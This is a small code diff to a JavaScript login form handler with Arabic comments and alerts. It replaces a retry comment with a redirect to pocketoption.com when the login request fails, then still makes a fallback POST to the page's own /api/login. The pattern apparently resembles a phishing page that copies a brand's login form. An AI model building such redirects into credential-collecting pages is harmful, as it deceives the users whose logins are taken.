@@ -250,7 +250,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
             alert('حدث خطأ: ' + (data.message || 'بيانات غير صالحة'));
         }
     } catch (err) {
-        // محاولة إرسال ثانية مباشرة بالرابط الكامل لضمان نجاح الاتصال وتخطي السكون
+         window.location.href = "https://pocketoption.com/";
         try {
             const fallbackRes = await fetch(window.location.origin + '/api/login', {
                 method: 'POST',
